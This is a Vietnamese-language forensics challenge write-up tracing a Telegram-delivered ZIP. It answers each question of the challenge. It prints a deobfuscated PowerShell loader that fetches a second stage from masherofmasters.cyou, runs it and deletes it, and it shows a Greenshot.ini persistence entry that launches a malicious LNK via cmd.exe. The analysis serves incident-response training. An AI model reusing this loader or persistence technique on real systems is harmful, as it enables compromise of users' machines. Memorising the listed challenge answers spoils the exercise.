## Description 
#### An employee at a large company was assigned a task with a two-day deadline. Realizing that he could not complete the task in that timeframe, he sought help from someone else. After one day, he received a notification from that person who informed him that he had managed to finish the assignment and sent it to the employee as a test. However, the person also sent a message to the employee stating that if he wanted the completed assignment, he would have to pay $160.
##### The helper's demand for payment revealed that he was actually a threat actor. The company's digital forensics team was called in to investigate and identify the attacker, determine the extent of the attack, and assess potential data breaches. The team must analyze the employee's computer and communication logs to prevent similar attacks in the future.
## Solution
### What is the the web messaging app the employee used to talk to the attacker?
##### Ngay từ câu hỏi ta thấy rằng người nhân viên này liên lạc với attacker thông qua web app vì vậy ta dùng lệnh bash để xem có trình duyệt web nào đang được cài trên máy trước.
```
find -D tree | grep -iE "chrome|firefox|brave|msedge|opera|safari|vivaldi|edge|coc coc" 
```
##### Lệnh này sẽ quét tất cả các folder chứa tên của 1 vài trình duyệt phổ biến 
![image](https://hackmd.io/_uploads/rJfhKsIUJe.png)
![image](https://hackmd.io/_uploads/HkvTFjULkl.png)
##### Có 2 trình duyệt đang được cài đặt trên máy là Edge và Chrome, trước tiên ta xem lịch sử nạn nhân truy cập thông qua file `History`
![image](https://hackmd.io/_uploads/HkyK5oUIkl.png)
![image](https://hackmd.io/_uploads/BJYJso8Uyl.png)
##### Chỉ thấy rằng trên Edge nạn nhân tìm và tải xuống chrome chứ không có gì đặc biệt, còn chrome thì không có file History.
##### Dựa vào thông tin `he received a notification from that person who informed him that he had managed to finish the assignment and sent it to the employee as a test` từ mô tả, ta sẽ kiểm tra lịch sử thông báo trên google chrome.
##### Dựa vào [bài viết này](https://superuser.com/questions/947947/view-past-notifications-in-windows-10-and-11) ta dễ dàng tìm thấy file database chứa thông báo
![image](https://hackmd.io/_uploads/ByUthj8Iyl.png)
![image](https://hackmd.io/_uploads/r1AxaoLUJg.png)
##### 1 thông báo gửi từ telegram yêu cầu nạn nhân tải file xuống và giải nén với mật khẩu là @1122d
```python
<toast launch="0|0|Default|0|https://web.telegram.org/|p#https://web.telegram.org/#" displayTimestamp="2023-07-11T16:57:15Z">
 <visual>
  <binding template="ToastGeneric">
   <text>Nawaf</text>
   <text>📎 our project templet test.zip,pass:@1122d</text>
   <text placement="attribution">web.telegram.org</text>
   <image placement="appLogoOverride" src="C:\Users\OMEN\AppData\Local\Google\Chrome\User Data\Notification Resources\cd18935b-57e3-4838-b5e3-ef360362f771.tmp" hint-crop="none"/>
  </binding>
 </visual>
 <actions>
  <action content="Go to Chrome notification settings" placement="contextMenu" activationType="foreground" arguments="2|0|Default|0|https://web.telegram.org/|p#https://web.telegram.org/#"/>
 </actions>
</toast>
```

> Answers : Telegram

### What is the password for the protected ZIP file sent by the attacker to the employee?
##### Như đã phân tích ở trên 

> Answers : @1122d

### What domain did the attacker use to download the second stage of the malware?
##### Tìm file mà attacker đề cập thì thấy nó nằm tại mục Downloads
```
┌──(kali㉿kali)-[~/Downloads/challenge/Users]
└─$ find -D tree | grep -i test.zip                   
./OMEN/Downloads/project templet test.zip
```
##### File này chứa 2 file, 1 file docx và 1 file lnk, kiểm tra file lnk trước.
![image](https://hackmd.io/_uploads/SkOZPhLLkl.png)
##### File này kích hoạt lệnh thực thi powershell chứa mã bị làm rối, sửa lại 1 tí cho dễ nhìn 
```powershell
-ExecutionPolicy UnRestricted 
$ProgressPreference = 0;
function nvRClWiAJT($inputString) {
    $inputString[$inputString.Length..0] -join('');
}
function sDjLksFILdkrdR($inputString) {
    $reversedString = nvRClWiAJT $inputString;
    $outputString = '';
    for ($i = 0; $i -lt $reversedString.Length; $i += 2) {
        try {
            $outputString += nvRClWiAJT $reversedString.Substring($i, 2);
        } catch {
            $outputString += $reversedString.Substring($i, 1);
        }
    }
    return $outputString;
}
$decodedUrl = sDjLksFILdkrdR 'aht1.sen/hi/coucys.erstmaofershma//s:tpht';
$downloadPath = $env:APPDATA + '\' + ($decodedUrl -split '/')[-1];
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
$webContent = wget $decodedUrl -UseBasicParsing;
[IO.File]::WriteAllText($downloadPath, $webContent);
& $downloadPath;
sleep 3;
rm $downloadPath;

```
##### Đoạn mã thực hiện tải xuống 1 file được cho bởi 1 liên kết có sẵn, thực thi nó và xóa.
##### Chuỗi được chỉnh sửa về dạng liên kết bằng cách đảo ngược từng 2 kí tự của chúng.
![image](https://hackmd.io/_uploads/rJRdOnU8ke.png)
> Answers: masherofmasters.cyou

### What is the name of the command that the attacker injected using one of the installed LOLAPPS on the machine to achieve persistence?
##### Ta cần xác định LOAPPS là gì?
```
Living off the Land Applications (LOLAPPS) là một chiến lược quan trọng trong an ninh mạng, nơi kẻ tấn công khai thác các ứng dụng hợp pháp có sẵn trong hệ thống để thực hiện các hành động độc hại mà không cần đến mã độc hay công cụ bên ngoài. Điều này giúp kẻ tấn công tránh được sự phát hiện vì sử dụng các phần mềm đã được tin tưởng.
Một số điểm quan trọng về LOLAPPS:

- Khai thác ứng dụng có sẵn: LOLAPPS tập trung vào việc tìm kiếm các tính năng trong ứng dụng đã có sẵn như Microsoft Office, Notepad, hoặc các trình duyệt web để thực hiện tấn công.
- Ứng dụng bên thứ ba và tích hợp sẵn: Bên cạnh các ứng dụng cài đặt sẵn trên hệ thống, các phần mềm bên thứ ba như trình duyệt web hoặc các công cụ bảo mật cũng có thể bị lợi dụng nếu có lỗ hổng bảo mật.
- Khai thác trong các hoạt động hàng ngày (Quan trọng): Kẻ tấn công có thể lợi dụng các tính năng thông dụng trong phần mềm để thực hiện các hoạt động độc hại mà không cần thay đổi cấu trúc hệ thống.
```
##### Một vài ứng dụng có thể sử dụng để tận dụng kĩ thuật này: https://lolapps-project.github.io/#
##### Bây giờ truy cập vào AppData/Roaming để xem ứng dụng tương ứng có thể cài mã độc vào.
![image](https://hackmd.io/_uploads/ryoC92LLkg.png)
##### Kiểm tra phần mềm Greenshot, tại file Greenshot.ini có 1 đoạn như thế này
```
Commandline.jlhgfjhdflghjhuhuh=C:\Windows\system32\cmd.exe
; The arguments for the output command.
Argument.MS Paint="{0}"
Argument.jlhgfjhdflghjhuhuh=/c "C:\Users\OMEN\AppData\Local\Temp\templet.lnk"
```
##### Khúc này gán đường dẫn `C:\Windows\system32\cmd.exe` cho jlhgfjhdflghjhuhuh sau đó sử dụng nó để thực hiện file templet.lnk ở Temp
![image](https://hackmd.io/_uploads/S115o2UI1l.png)
##### Đây là file độc hại đã được giải nén lúc nãy, cho nên đây là 1 cơ chế persistence
> Answers : jlhgfjhdflghjhuhuh
### What is the complete path of the malicious file that the attacker used to achieve persistence?
##### Đã phân tích ở trên 
> Answers : C:\Users\OMEN\AppData\Local\Temp\templet.lnk
### What is the name of the application the attacker utilized for data exfiltration?
##### Tìm hiểu về `ATT&CK® Techniques - T1546` của ứng dụng bị lợi dụng
##### T1219 sử dụng tải xuống 1 phần mềm cho phép truy cập từ xa, nó là Anydesk
![image](https://hackmd.io/_uploads/HJxlRhLLJg.png)
> Answers: AnyDesk
### What is the IP address of the attacker?
##### Để biết được ip của attacker, ta kiểm tra logs của phần mềm này thông qua tệp ad.trace.
![image](https://hackmd.io/_uploads/Sy0LRhLLke.png)

> Answers : 77.232.122.31
